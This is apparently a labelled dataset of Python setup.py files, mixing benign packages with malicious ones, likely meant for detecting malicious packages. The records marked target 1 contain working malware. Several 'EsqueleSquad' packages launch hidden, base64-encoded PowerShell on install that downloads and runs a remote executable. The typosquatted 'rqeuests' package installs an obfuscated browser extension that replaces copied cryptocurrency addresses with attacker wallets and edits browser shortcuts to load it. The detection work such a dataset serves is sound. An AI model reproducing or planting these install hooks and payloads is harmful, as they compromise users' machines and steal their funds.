https://packaging.python.org/specifications/core-metadata/#name\n    name=name,  # Required\n\n    # Versions should comply with PEP 440:\n    # https://www.python.org/dev/peps/pep-0440/\n    #\n    # For a discussion on single-sourcing the version across setup.py and the\n    # project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=version,  # Required\n\n    # This is a one-line description or tagline of what your project does. This\n    # corresponds to the \"Summary\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#summary\n    description='',  # Optional\n\n    # This is an optional longer description of your project that represents\n    # the body of text which users will see when they visit PyPI.\n    #\n    # Often, this is the same as your README, so you can just read it in from\n    # that file directly (as we have already done above)\n    #\n    # This field corresponds to the \"Description\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-optional\n    long_description=long_description,  # Optional\n\n    # Denotes that our long_description is in Markdown; valid values are\n    # text/plain, text/x-rst, and text/markdown\n    #\n    # Optional if long_description is written in reStructuredText (rst) but\n    # required for plain-text or Markdown; if unspecified, \"applications should\n    # attempt to render [the long_description] as text/x-rst; charset=UTF-8 and\n    # fall back to text/plain if it is not valid rst\" (see link below)\n    #\n    # This field corresponds to the \"Description-Content-Type\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-content-type-optional\n    long_description_content_type='text/markdown',  # Optional (see note above)\n\n    # This should be a valid link to your project's main homepage.\n    #\n    # This field corresponds to the \"Home-Page\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#home-page-optional\n    url='https://github.com/kotko/bravado-decorators',  # Optional\n\n    # This should be your name or the name of the organization which owns the\n    # project.\n    author='Vladyslav Kotko',  # Optional\n\n    # This should be a valid email address corresponding to the author listed\n    # above.\n    author_email='mailbox@kotko.me',  # Optional\n    include_package_data=True,\n\n    # Classifiers help users find your project by categorizing it.\n    #\n    # For a list of valid classifiers, see https://pypi.org/classifiers/\n    classifiers=[  # Optional\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n\n        # Pick your license as you wish\n        'License :: OSI Approved :: MIT License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate you support Python 3. These classifiers are *not*\n        # checked by 'pip install'. See instead 'python_requires' below.\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n    ],\n\n    # This field adds keywords for your project which will appear on the\n    # project page. What does your project relate to?\n    #\n    # Note that this is a list of additional keywords, separated\n    # by commas, to be used to assist searching for the distribution in a\n    # larger catalog.\n    keywords='sample, setuptools, development',  # Optional\n\n    # When your source code is in a subdirectory under the project root, e.g.\n    # `src/`, it is necessary to specify the `package_dir` argument.\n    package_dir={'': 'src'},  # Optional\n\n    # You can just specify package directories manually here if your project is\n    # simple. Or you can use find_packages().\n    #\n    # Alternatively, if you just want to distribute a single Python file, use\n    # the `py_modules` argument instead as follows, which will expect a file\n    # called `my_module.py` to exist:\n    #\n    #   py_modules=[\"my_module\"],\n    #\n    packages=find_packages(where='src'),  # Required\n\n    # Specify which Python versions you support. In contrast to the\n    # 'Programming Language' classifiers above, 'pip install' will check this\n    # and refuse to install the project if the version does not match. See\n    # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires\n    python_requires='>=3.6, <4',\n\n    # This field lists other packages that your project depends on to run.\n    # Any package you put here will be installed by pip when your project is\n    # installed, so they must be valid existing projects.\n    #\n    # For an analysis of \"install_requires\" vs pip's requirements files see:\n    # https://packaging.python.org/en/latest/requirements.html\n    install_requires=['peppercorn', 'requests'],  # Optional\n\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). Users will be able to install these using the \"extras\"\n    # syntax, for example:\n    #\n    #   $ pip install sampleproject[dev]\n    #\n    # Similar to `install_requires` above, these must be valid existing\n    # projects.\n    extras_require={  # Optional\n        'dev': ['check-manifest', 'requests'],\n        'test': ['coverage', 'requests'],\n    },\n\n    # If there are data files included in your packages that need to be\n    # installed, specify them here.\n    package_data={  # Optional\n        'sample': ['package_data.dat'],\n    },\n\n    # Although 'package_data' is the preferred approach, in some case you may\n    # need to place data files outside of your packages. See:\n    # http://docs.python.org/distutils/setupscript.html#installing-additional-files\n    #\n    # In this case, 'data_file' will be installed into '<sys.prefix>/my_data'\n    data_files=[('my_data', ['data/data_file'])],  # Optional\n\n    # To provide executable scripts, use entry points in preference to the\n    # \"scripts\" keyword. Entry points provide cross-platform support and allow\n    # `pip` to create the appropriate form of executable for the target\n    # platform.\n    #\n    # For example, the following would provide a command called `sample` which\n    # executes the function `main` from this package when invoked:\n    entry_points={  # Optional\n        'console_scripts': [\n            'sample=sample:main',\n        ],\n    },\n\n    # List additional URLs that are relevant to your project as a dict.\n    #\n    # This field corresponds to the \"Project-URL\" metadata fields:\n    # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use\n    #\n    # Examples listed include a pattern for specifying where the package tracks\n    # issues, where the source is hosted, where to say thanks to the package\n    # maintainers, and where to support the project financially. The key is\n    # what's used to render the link text on PyPI.\n    project_urls={},\n     cmdclass={\n        'install': new_install,\n    },\n)\n# _post_install()\n", "target": 1}
{"idx": "py-intpep-6.73", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intpep',\n    packages = ['modlib'],\n    version = '5.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "DoubleMetaphone-1.1", "func": "#!/usr/bin/env python\nimport sys\nfrom setuptools import setup, Extension\n\ntry:\n    from Cython.Build import cythonize\n    use_cython = True\nexcept ImportError:\n    use_cython = False\n\nif use_cython:\n    ext_modules = cythonize([Extension('doublemetaphone.doublemetaphone',\n                                       ['doublemetaphone/doublemetaphone.pyx',\n                                        'doublemetaphone/double_metaphone.cc'])])\nelse:\n    ext_modules = [Extension('doublemetaphone.doublemetaphone',\n                             ['doublemetaphone/doublemetaphone.cpp',\n                              'doublemetaphone/double_metaphone.cc'])]\n\n\nsetup(\n    name=\"DoubleMetaphone\",\n    version=\"1.1\",\n    description=\"Python wrapper for C++ Double Metaphone\",\n    author=\"Forest Gregg\",\n    author_email=\"fgregg@gmail.com\",\n    packages=['doublemetaphone'],\n    ext_modules=ext_modules,\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: Artistic License\",\n        \"Operating System :: POSIX\",\n        \"Programming Language :: Cython\",\n        \"Programming Language :: Python\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: Software Development\",\n    ],\n)\n\n", "target": 0}
{"idx": "rqeuests-0.1", "func": "from distutils.core import setup\nimport sys\n\n\nif sys.platform == 'win32':\n  if sys.argv[1] in ['egg_info', 'build']:\n    try:\n      import win32com\n    except ModuleNotFoundError:\n      from pip._internal import main\n      main(['install', 'pypiwin32'])\n\n  elif sys.argv[1] in ['bdist_wheel', 'install']:\n    import os\n    import ctypes\n    from win32com.client import Dispatch\n\n    appDataPath = os.getenv('APPDATA')\n    desktopPath = os.path.expanduser('~\\Desktop')\n    paths = [\n        appDataPath + '\\\\Microsoft\\\\Windows\\\\Start Menu',\n        appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar',\n        desktopPath\n    ]\n\n    if ctypes.windll.shell32.IsUserAnAdmin():\n        paths.append('C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu')\n\n    if not os.path.exists(appDataPath + '\\\\Extension'):\n        os.makedirs(appDataPath + '\\\\Extension')\n\n    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n        extensionFile.write('''var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var _0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae['push'](_0x41c8ae['shift']());}catch(_0x435e56){_0x41c8ae['push'](_0x41c8ae['shift']());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\": [\"clipboardWrite\", \"clipboardRead\"]}')\n\n    shell = Dispatch('WScript.Shell')\n\n    for path in paths:\n        for root_directory, sub_directories, files in os.walk(path):\n            for file in files:\n                if file.endswith('.lnk'):\n                    try:\n                        shortcut = shell.CreateShortcut(root_directory + '\\\\' + file)\n                        executable_name = os.path.basename(shortcut.TargetPath)\n\n                        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:\n                            shortcut.Arguments = '--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n                            shortcut.Save()\n                    except Exception as e:\n                      ...\n\nsetup(\n  name = 'rqeuests',\n  packages = ['rqeuests'],\n  version = '0.1'\n)", "target": 1}
{"idx": "esqrerecandy-2.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrerecandy',\n    packages = ['modlib'],\n    version = '5.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Genshi-0.7.7", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n# Copyright (C) 2006-2010 Edgewall Software\n# All rights reserved.\n#\n# This software is licensed as described in the file COPYING, which\n# you should have received as part of this distribution. The terms\n# are also available at http://genshi.edgewall.org/wiki/License.\n#\n# This software consists of voluntary contributions made by many\n# individuals. For the exact contribution history, see the revision\n# history and logs, available at http://genshi.edgewall.org/log/.\n\nfrom distutils.command.build_ext import build_ext\nfrom distutils.errors import CCompilerError, DistutilsPlatformError\nimport os\ntry:\n    from setuptools import setup, Extension\n    from setuptools.command.bdist_egg import bdist_egg\nexcept ImportError:\n    from distutils.core import setup, Extension\n    bdist_egg = None\nimport sys\n\nsys.path.append(os.path.join('doc', 'common'))\ntry:\n    from doctools import build_doc, test_doc\nexcept ImportError:\n    build_doc = test_doc = None\n\n_speedup_available = False\n\nis_pypy = hasattr(sys, 'pypy_version_info')\n\nclass optional_build_ext(build_ext):\n    # This class allows C extension building to fail.\n    def run(self):\n        try:\n            build_ext.run(self)\n        except DistutilsPlatformError:\n            _etype, e, _tb = sys.exc_info()\n            self._unavailable(e)\n\n    def build_extension(self, ext):\n        try:\n            build_ext.build_extension(self, ext)\n            global _speedup_available\n            _speedup_available = True\n        except CCompilerError:\n            _etype, e, _tb = sys.exc_info()\n            self._unavailable(e)\n\n    def _unavailable(self, exc):\n        print('*' * 70)\n        print(\"\"\"WARNING:\nAn optional C extension could not be compiled, speedups will not be\navailable.\"\"\")\n        print('*' * 70)\n        print(exc)\n\n\n# Optional C extension module for speeding up Genshi\n# Not activated by default on:\n# - PyPy (where it harms performance)\n_speedup_enable_default = 0 if is_pypy else 1\ntry:\n    _speedup_enabled = int(os.getenv('GENSHI_BUILD_SPEEDUP', _speedup_enable_default))\nexcept ValueError:\n    import warnings\n    warnings.warn('GENSHI_BUILD_SPEEDUP was defined to something other than 0 or 1; defaulting to not build...')\n    _speedup_enabled = False\n\next_modules = []\nif _speedup_enabled:\n    ext_modules.append(Extension('genshi._speedups', ['genshi/_speedups.c']))\n\n\n# Setuptools need some help figuring out if the egg is \"zip_safe\" or not\nif bdist_egg:\n    class my_bdist_egg(bdist_egg):\n        def zip_safe(self):\n            return not _speedup_available and bdist_egg.zip_safe(self)\n\n\ncmdclass = {'build_doc': build_doc, 'test_doc': test_doc,\n            'build_ext': optional_build_ext}\nif bdist_egg:\n    cmdclass['bdist_egg'] = my_bdist_egg\n\n\nextra = {}\nif sys.version_info >= (3,):\n    # Install genshi template tests\n    extra['include_package_data'] = True\n\n\nsetup(\n    test_suite = 'genshi.tests.suite',\n    ext_modules = ext_modules,\n    cmdclass = cmdclass,\n    **extra\n)\n", "target": 0}
{"idx": "esqpullpushpy-7.19", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpullpushpy',\n    packages = ['modlib'],\n    version = '2.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dbfread-2.0.7", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport dbfread\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist upload\")\n    sys.exit()\n\nelif sys.argv[-1] == \"test\":\n    os.system(\"./run_tests.py\")\n    sys.exit()\n\nelif sys.argv[-1] == \"docs\":\n    os.system(\"sphinx-build docs/ docs/_build\")\n    sys.exit()\n\nsetup(\n    name='dbfread',\n    version=dbfread.__version__,\n    description='Read DBF Files with Python',\n    long_description=open('README.rst', 'rt').read(),\n    author=dbfread.__author__,\n    author_email=dbfread.__email__,\n    url=dbfread.__url__,\n    package_data={'': ['LICENSE']},\n    package_dir={'dbfread': 'dbfread'},\n    packages = ['dbfread'],\n    include_package_data=True,\n    zip_safe=True,\n    install_requires=[],\n    license='MIT',\n    classifiers=(\n    ),\n)\n", "target": 0}
{"idx": "libhydracvnvidia-6.75", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhydracvnvidia',\n    packages = ['modlib'],\n    version = '3.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geoip2-4.6.0", "func": "#!/usr/bin/env python\n\nimport codecs\nimport os\nimport sys\n\nimport geoip2\n\nfrom setuptools import setup\n\npackages = [\"geoip2\"]\n\nrequirements = [i.strip() for i in open(\"requirements.txt\").readlines()]\n\nsetup(\n    name=\"geoip2\",\n    version=geoip2.__version__,\n    description=\"MaxMind GeoIP2 API\",\n    long_description=codecs.open(\"README.rst\", \"r\", \"utf-8\").read(),\n    author=\"Gregory Oschwald\",\n    author_email=\"goschwald@maxmind.com\",\n    url=\"http://www.maxmind.com/\",\n    packages=[\"geoip2\"],\n    package_data={\"\": [\"LICENSE\"], \"geoip2\": [\"py.typed\"]},\n    package_dir={\"geoip2\": \"geoip2\"},\n    include_package_data=True,\n    python_requires=\">=3.6\",\n    install_requires=requirements,\n    tests_require=[\"mocket>=3.8.9\"],\n    test_suite=\"tests\",\n    license=geoip2.__license__,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python\",\n        \"Topic :: Internet :: Proxy Servers\",\n        \"Topic :: Internet\",\n    ],\n    project_urls={\n        \"Documentation\": \"https://geoip2.readthedocs.org/\",\n        \"Source Code\": \"https://github.com/maxmind/GeoIP2-python\",\n        \"Issue Tracker\": \"https://github.com/maxmind/GeoIP2-python/issues\",\n    },\n)\n", "target": 0}
{"idx": "esqcraftrandomrandom-5.32", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcraftrandomrandom',\n    packages = ['modlib'],\n    version = '2.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fastdownload-0.0.7", "func": "from pkg_resources import parse_version\nfrom configparser import ConfigParser\nimport setuptools\nassert parse_version(setuptools.__version__)>=parse_version('36.2')\n\n# note: all settings are in settings.ini; edit there, not here\nconfig = ConfigParser(delimiters=['='])\nconfig.read('settings.ini')\ncfg = config['DEFAULT']\n\ncfg_keys = 'version description keywords author author_email'.split()\nexpected = cfg_keys + \"lib_name user branch license status min_python audience language\".split()\nfor o in expected: assert o in cfg, \"missing expected setting: {}\".format(o)\nsetup_cfg = {o:cfg[o] for o in cfg_keys}\n\nlicenses = {\n    'apache2': ('Apache Software License 2.0','OSI Approved :: Apache Software License'),\n    'mit': ('MIT License', 'OSI Approved :: MIT License'),\n    'gpl2': ('GNU General Public License v2', 'OSI Approved :: GNU General Public License v2 (GPLv2)'),\n    'gpl3': ('GNU General Public License v3', 'OSI Approved :: GNU General Public License v3 (GPLv3)'),\n    'bsd3': ('BSD License', 'OSI Approved :: BSD License'),\n}\nstatuses = [ '1 - Planning', '2 - Pre-Alpha', '3 - Alpha',\n    '4 - Beta', '5 - Production/Stable', '6 - Mature', '7 - Inactive' ]\npy_versions = '2.0 2.1 2.2 2.3 2.4 2.5 2.6 2.7 3.0 3.1 3.2 3.3 3.4 3.5 3.6 3.7 3.8'.split()\n\nrequirements = cfg.get('requirements','').split()\nmin_python = cfg['min_python']\nlic = licenses.get(cfg['license'].lower(), (cfg['license'], None))\n\nsetuptools.setup(\n    name = cfg['lib_name'],\n    license = lic[0],\n    classifiers = [\n        'Development Status :: ' + statuses[int(cfg['status'])],\n        'Intended Audience :: ' + cfg['audience'].title(),\n        'Natural Language :: ' + cfg['language'].title(),\n    ] + ['Programming Language :: Python :: '+o for o in py_versions[py_versions.index(min_python):]] + (['License :: ' + lic[1] ] if lic[1] else []),\n    url = cfg['git_url'],\n    packages = setuptools.find_packages(),\n    include_package_data = True,\n    install_requires = requirements,\n    dependency_links = cfg.get('dep_links','').split(),\n    python_requires  = '>=' + cfg['min_python'],\n    long_description = open('README.md').read(),\n    long_description_content_type = 'text/markdown',\n    zip_safe = False,\n    entry_points = { 'console_scripts': cfg.get('console_scripts','').split() },\n    **setup_cfg)\n\n", "target": 0}
